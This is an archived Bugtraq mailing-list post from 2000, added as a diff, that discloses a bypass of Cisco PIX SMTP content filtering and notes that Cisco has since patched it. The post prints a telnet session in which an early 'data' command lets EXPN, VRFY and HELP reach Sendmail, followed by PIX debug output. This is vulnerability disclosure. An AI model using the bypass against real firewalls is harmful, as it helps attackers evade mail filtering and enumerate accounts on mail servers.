@@ -1,0 +1,397 @@
+<meta charset="utf-8"><!-- MHonArc v2.6.16 -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"
+                      "http://www.w3.org/TR/REC-html40/loose.dtd">
+<HTML>
+<HEAD>
+<link rel="alternate" type="application/rss+xml" title="RSS" href="http://seclists.org/rss/bugtraq.rss">
+<title>Bugtraq: Re: Cisco PIX Firewall (smtp content filtering hack) [Finally              resolved]</title>
+<meta name="Subject" content="Re: Cisco PIX Firewall (smtp content filtering hack) [Finally              resolved]"/>
+<meta name="Author" content="Fabio Pietrosanti (naif)"/>
+<link REL="SHORTCUT ICON" HREF="/shared/images/tiny-eyeicon.png" TYPE="image/png">
+<META NAME="ROBOTS" CONTENT="NOARCHIVE">
+<link rel="stylesheet" href="/shared/css/insecdb.css" type="text/css">
+</HEAD>
+<BODY BGCOLOR="#2A0D45" TEXT="#000000"><div style="all:initial;display:block;position:sticky;top:0;z-index:2147483647;background:#0d5c58;color:#fff;font:13px/1.4 system-ui,sans-serif;padding:8px 14px">Archived copy for <a style="color:#f2b134" href="/">fabio.pietrosanti.it</a> · source: <a style="color:#f2b134" href="https://seclists.org/bugtraq/2000/Oct/52">seclists.org/bugtraq/2000/Oct/52</a> · captured 2011-09-15 · scripts removed</div>
+
+<TABLE CELLPADDING="0" WIDTH="100%" CELLSPACING="0">
+<TR><TD ALIGN="left"><A HREF="/"><IMG BORDER=0 ALT="Home page logo"
+SRC="/images/sitelogo.png" HEIGHT=90 WIDTH=168></A></TD>
+<TD VALIGN="bottom" ALIGN="right">
+<!-- Begin TopBanner Code -->
+<!-- AdSpeed.com Serving Code 7.9.5 for [Zone] TopBanner 728x90 -->
+
+<noscript>
+</noscript><!-- AdSpeed.com End -->
+<!-- End Banner Code -->
+
+</TD></TR></TABLE>
+<TABLE WIDTH="100%" CELLPADDING="0" CELLSPACING="0"><TR>
+<TD ALIGN="left" WIDTH="130" VALIGN="top" class="sidebar">
+
+<!-- SECWIKI PORTAL INSERT -->
+
+<ul>
+<li><a href="http://nmap.org/">Nmap Security Scanner</a>
+<ul>
+<li><a href="http://nmap.org/">Intro</a></li>
+<li><a href="http://nmap.org/book/man.html">Ref Guide</a></li>
+<li><a href="http://nmap.org/book/install.html">Install Guide</a></li>
+<li><a href="http://nmap.org/download.html">Download</a></li>
+<li><a href="http://nmap.org/changelog.html">Changelog</a></li>
+<li><a href="http://nmap.org/book/">Book</a></li>
+<li><a href="http://nmap.org/docs.html">Docs</a></li>
+</ul>
+<li><a href="http://seclists.org/">Security Lists</a>
+<ul>
+<li><a href="http://seclists.org/nmap-hackers/">Nmap Hackers</a></li>
+<li><a href="http://seclists.org/nmap-dev/">Nmap Dev</a></li>
+<li><a href="http://seclists.org/bugtraq/">Bugtraq</a></li>
+<li><a href="http://seclists.org/fulldisclosure/">Full Disclosure</a></li>
+<li><a href="http://seclists.org/pen-test/">Pen Test</a></li>
+<li><a href="http://seclists.org/basics/">Basics</a></li>
+<li><a href="http://seclists.org/">More</a></li>
+</ul>
+<li><a href="http://sectools.org">Security Tools</a>
+<ul>
+<li><a href="http://sectools.org/crackers.html">Pass crackers</a></li>
+<li><a href="http://sectools.org/sniffers.html">Sniffers</a></li>
+<li><a href="http://sectools.org/vuln-scanners.html">Vuln Scanners</a></li>
+<li><a href="http://sectools.org/web-scanners.html">Web scanners</a></li>
+<li><a href="http://sectools.org/wireless.html">Wireless</a></li>
+<li><a href="http://sectools.org/sploits.html">Exploitation</a></li>
+<li><a href="http://sectools.org/packet-crafters.html">Packet crafters</a></li>
+<li><a href="http://sectools.org/">More</a></li>
+</ul>
+<li><a href="http://insecure.org/">Site News</a></li>
+<li><a href="http://insecure.org/advertising.html">Advertising</a></li>
+<li><a href="http://insecure.org/fyodor/">About/Contact</a></li>
+<li>
+<!-- SiteSearch Google -->
+<form action="http://insecure.org/search.html" id="cse-search-box-sidebar">
+  <div>
+    <input type="hidden" name="cx" value="partner-pub-0078565546631069:bx60rb-fytx">
+    <input type="hidden" name="cof" value="FORID:9">
+    <input type="hidden" name="ie" value="ISO-8859-1">
+    <input type="text" name="q" size="16">
+    <input type="submit" name="sa" value="Site Search">
+  </div>
+</form>
+
+<!-- End SiteSearch Google -->
+</li>
+<!-- These can come back if I ever update them ...
+<li><a href="http://insecure.org/links.html">Exceptional Links</a></li>
+<li><a href="http://insecure.org/reading.html">Good Reading</a></li>
+-->
+<li><a href="http://insecure.org/sploits.html">Exploit World</a></li>
+<li><a href="http://insecure.org/advertising.html">Sponsors:</a>
+
+<!-- Begin Sidebar 1 Banner Code -->
+<!-- NOTE: Acunetix does NOT want to use the rotation script -->
+<a href="http://www.acunetix.com/cross-site-scripting/scanner.htm"><img height=60 width=120 border=0 src="/shared/images/p/Acunetix/acunetix-freexss-120x60.gif" alt=""></a>
+<!-- End Sidebar 1 Banner Code -->
+<BR><BR>
+
+<!-- Begin Sidebar 2 Banner Code -->
+<a href="http://landlanss.gfi.com/freeware-network-security-scanner-sm/?adv=731&amp;loc=1"><img height=90 width=120 border=0 src="/shared/images/p/gfi/120x90_gfi_languard_rebranding.gif" alt=""></a>
+<!-- End Sidebar 2 Banner Code -->
+<BR><BR>
+
+<!-- Google Skyscraper Ad -->
+
+
+<!-- End Google Skyscraper Ad -->
+</ul>
+</TD>
+<TD BGCOLOR="#FFFFFF" VALIGN="top" ALIGN="left"><IMG
+SRC="/shared/images/topleftcurve.gif" alt="/"><TABLE CELLPADDING="4" WIDTH="100%"><TR><TD BGCOLOR="#FFFFFF">
+
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<p>
+<A HREF="/bugtraq/"><img src="/images/bugtraq-logo.png" border="0" width="80" style="vertical-align: middle" alt="bugtraq logo"></A>
+<FONT SIZE="+1"><a href="http://seclists.org/bugtraq/">Bugtraq</a>
+mailing list archives</FONT><br>
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<!-- Google Custom SiteSearch -->
+<form action="http://insecure.org/search.html" id="top-search-box">
+<a href="51"><img src="/images/left-icon-16x16.png" border=0 width=16 height=16></a>&nbsp;&nbsp;<a href="date.html#52">By Date</a>&nbsp;&nbsp;<a href="53"><img src="/images/right-icon-16x16.png" border=0 width=16 height=16></a>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<a href="51"><img src="/images/left-icon-16x16.png" border=0 width=16 height=16></a>&nbsp;&nbsp;<a href="index.html#52">By Thread</a>&nbsp;&nbsp;<a href="53"><img src="/images/right-icon-16x16.png" border=0 width=16 height=16></a>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+    <input type="hidden" name="cx" value="partner-pub-0078565546631069:bx60rb-fytx" />
+    <input type="hidden" name="cof" value="FORID:9" />
+    <input type="hidden" name="ie" value="ISO-8859-1" />
+    <input type="text" name="q" size="24" />
+    <input type="submit" name="sa" value="Search" />
+</form>
+
+<!-- End Google Custom SiteSearch -->
+</p>
+
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<font size="+2"><b>Re: Cisco PIX Firewall (smtp content filtering hack) [Finally              resolved]</b></font>
+<hr>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+
+
+<em>From</em>: &quot;Fabio Pietrosanti (naif)&quot; &lt;fabio () TELEMAIL IT&gt;<br>
+
+<em>Date</em>: Tue, 3 Oct 2000 11:15:25 +0200<br>
+
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<hr>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<pre style="margin: 0em;">Hi,
+This is the e-mail i sent to Cisco security-alert,
+Today Cisco Released 5.2(4) that fix also this bug ...
+
+The Cisco Patch to &quot;SMTP Content Filtering tricks proposed by
+naif () inet it &quot; could be
+avoid with the &quot;SMTP Content Filtering tricks proposed by Lincoln Yeoh &lt;
+lyeoh () pop jaring my &gt;&quot; .
+
+
+The Little hack posted on bugtraq by me on &quot;Tue, 19 Sep 2000&quot; work because
+pix completelly disable the sanity check after &quot;data&quot; command .
+
+Cisco Release the new PIX Versione that we installed on our test pix
+5.2(2) .
+
+The Cisco Advisor is:
+
+<a  rel="nofollow" href="http://www.cisco.com/warp/public/707/PIXfirewallSMTPfilter-pub.shtml">http://www.cisco.com/warp/public/707/PIXfirewallSMTPfilter-pub.shtml</a>
+
+The i read on bugtraq about a tricks of Jul similar to my advisor :
+
+<a  rel="nofollow" href="http://www.securityfocus.com/templates/archive.pike?threads=0&amp;list=1&amp;end=2000-07-09&amp;tid=68903&amp;start=2000-07-03&amp">http://www.securityfocus.com/templates/archive.pike?threads=0&amp;list=1&amp;end=2000-07-09&amp;tid=68903&amp;start=2000-07-03&amp</a>;
+
+So, 5.2(2) should avoid this problem and SMTP content filtering should
+work...
+
+Here the our Pix Test:
+newpix# sh ver
+
+Cisco Secure PIX Firewall Version 5.2(2)
+
+Compiled on Sun 24-Sep-00 18:59 by morlee
+
+newpix up 19 hours 27 mins
+
+Hardware:   SE440BX2, 128 MB RAM, CPU Pentium II 349 MHz
+Flash i28F640J5 @ 0x300, 16MB
+BIOS Flash AT29C257 @ 0xfffd8000, 32KB
+
+0: ethernet0: address is 00d0.b790.41a5, irq 11
+1: ethernet1: address is 00d0.b790.54d4, irq 10
+2: ethernet2: address is 00e0.b601.d289, irq 15
+3: ethernet3: address is 00e0.b601.d288, irq 9
+4: ethernet4: address is 00e0.b601.d287, irq 11
+5: ethernet5: address is 00e0.b601.d286, irq 10
+
+Licensed Features:
+Failover:       Enabled
+VPN-DES:        Enabled
+VPN-3DES:       Enabled
+Maximum Interfaces:     6
+Cut-through Proxy:      Enabled
+Guards:         Enabled
+Websense:       Enabled
+Throughput:     Unlimited
+ISAKMP peers:   Unlimited
+
+And the line regarding fixup in the config is:
+fixup protocol smtp 25
+
+===== Here the session...
+
+&lt;naif () naif&gt; [~] $ telnet  ourtest 25
+Trying 10.10.10.2...
+Connected to eagletmp.
+Escape character is &apos;^]&apos;.
+data wow
+expn root
+vrfy root
+help
+helo pinco
+220 **************************************************2******2000 ******00
+*0200 ******
+503 Need MAIL command
+250 Pinco Pallino &lt;pinco () ourtest ourdomain it&gt;
+250 &lt;root () ourtest ourdomain it&gt;
+214-This is Sendmail version 8.9.1
+214-Topics:
+214-    HELO    EHLO    MAIL    RCPT    DATA
+214-    RSET    NOOP    QUIT    HELP    VRFY
+214-    EXPN    VERB    ETRN    DSN
+214-For more info use &quot;HELP &lt;topic&gt;&quot;.
+214-To report bugs in the implementation send email to
+214-    sendmail-bugs () sendmail org 
+214-For local information send email to Postmaster at your site.
+214 End of HELP info
+250 ourtest.ourdomain.it Hello [10.10.10.10], pleased to meet you
+quit
+221 ourtest.ourdomain.it closing connection
+Connection closed by foreign host.
+
+#### As you can see we could bypass the &quot;fixup smtp&quot;
+
+===== Here Cisco Pix Debug
+
+        tcp: TCP MSS changed to 1380
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+        tcp: SYN out rcvd
+        tcp: TCP MSS changed to 1380
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+        tcp: exiting embyonic
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+        tcp: TCP MSS changed to 1380
+        tcp: TCP MSS changed to 1380
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+        smtp: data command
+        smtp: entering data mode
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+        tcp: TCP MSS changed to 1380
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+        tcp: TCP MSS changed to 1380
+tcp: TCP MSS changed to 1380
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+        smtp_respond: ERR: bad reply code
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+        smtp_respond: ERR: bad reply code
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+        smtp: quit command
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+        smtp_respond: ERR: bad reply code
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 &lt;- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -&gt; 10.10.10.10/3106)
+
+
+
+
+=====
+To Cisco :
+
+Please check carefully also CBAC, because i think that it affect also IOS
+CBAC inspect .
+I&apos;ll release the Advisor for this new version on bugtraq the next week, so
+you could release new Pix Version .
+
+
+
+
+
+
+
+On Thu, 21 Sep 2000, Ioannis Migadakis wrote:
+
+</pre><blockquote style="border-left: #5555EE solid 0.2em; margin: 0em; padding-left: 0.85em"><pre style="margin: 0em;">This particular vulnerability is not new.
+
+It has been posted to BUGTRAQ on 9 Jul 2000 by Lincoln Yeoh with a title
+&quot;Out of order SMTP DATA commands incorrectly allow pass-through mode in
+some firewall smtp filters/proxies&quot;
+
+The original post (does not say anything about Cisco PIX) can be found at:
+
+<a  rel="nofollow" href="http://www.securityfocus.com/templates/archive.pike?threads=0&amp;list=1&amp;end=200">http://www.securityfocus.com/templates/archive.pike?threads=0&amp;list=1&amp;end=200</a>
+0-07-09&amp;tid=68903&amp;start=2000-07-03&amp;
+
+Ioannis Migadakis
+
+</pre></blockquote><pre style="margin: 0em;">
+
+
+
+
+naif
+
+</pre>
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<hr>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<p>
+<a href="51"><img src="/images/left-icon-16x16.png" border=0 width=16 height=16></a>&nbsp;&nbsp;<a href="date.html#52">By Date</a>&nbsp;&nbsp;<a href="53"><img src="/images/right-icon-16x16.png" border=0 width=16 height=16></a>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<a href="51"><img src="/images/left-icon-16x16.png" border=0 width=16 height=16></a>&nbsp;&nbsp;<a href="index.html#52">By Thread</a>&nbsp;&nbsp;<a href="53"><img src="/images/right-icon-16x16.png" border=0 width=16 height=16></a>
+</p>
+<font size="+1"><b>Current thread:</b></font>
+<ul style="margin-top: 0em">
+<li><strong>Re: Cisco PIX Firewall (smtp content filtering hack) [Finally              resolved]</strong> <em>Fabio Pietrosanti (naif) (Oct 03)</em>
+</ul>
+
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</TD></TR>
+</TABLE>
+</TD></TR>
+<TR><TD></TD><TD ALIGN="center">
+<FONT COLOR="#FFFFFF">
+[ <A HREF="http://nmap.org"><FONT COLOR="#FFFFFF">Nmap</FONT></A> |
+  <A HREF="http://sectools.org"><FONT COLOR="#FFFFFF">Sec Tools</FONT></A> |
+  <A HREF="http://seclists.org/"><FONT COLOR="#FFFFFF">Mailing Lists</FONT></A> |
+  <A HREF="http://insecure.org/"><FONT COLOR="#FFFFFF">Site News</FONT></A> |
+  <A HREF="http://insecure.org/fyodor/"><FONT COLOR="#FFFFFF">About/Contact</FONT></A> |
+  <A HREF="http://insecure.org/advertising.html"><FONT COLOR="#FFFFFF">Advertising</FONT></A> |
+  <A HREF="http://insecure.org/privacy.html"><FONT COLOR="#FFFFFF">Privacy</FONT></A> ]<BR>
+</FONT>
+
+<!-- SiteSearch Google -->
+<!-- I changed the form id so that javascript acts on the top form on search.html page rather than this one. -->
+<form action="http://insecure.org/search.html" id="cse-search-box-bottom">
+  <div>
+    <input type="hidden" name="cx" value="partner-pub-0078565546631069:bx60rb-fytx">
+    <input type="hidden" name="cof" value="FORID:9">
+    <input type="hidden" name="ie" value="ISO-8859-1">
+    <input type="text" name="q" size="60">
+    <input type="submit" name="sa" value="Site Search">
+  </div>
+</form>
+
+<!-- End SiteSearch Google -->
+
+<!-- Bottom Banner -->
+
+
+<!-- End Bottom Banner -->
+
+<!-- Google Analytics -->
+
+
+<!-- End Google Analytics -->
+</TD></TR>
+</TABLE>
+</BODY>
+</HTML>
+
+
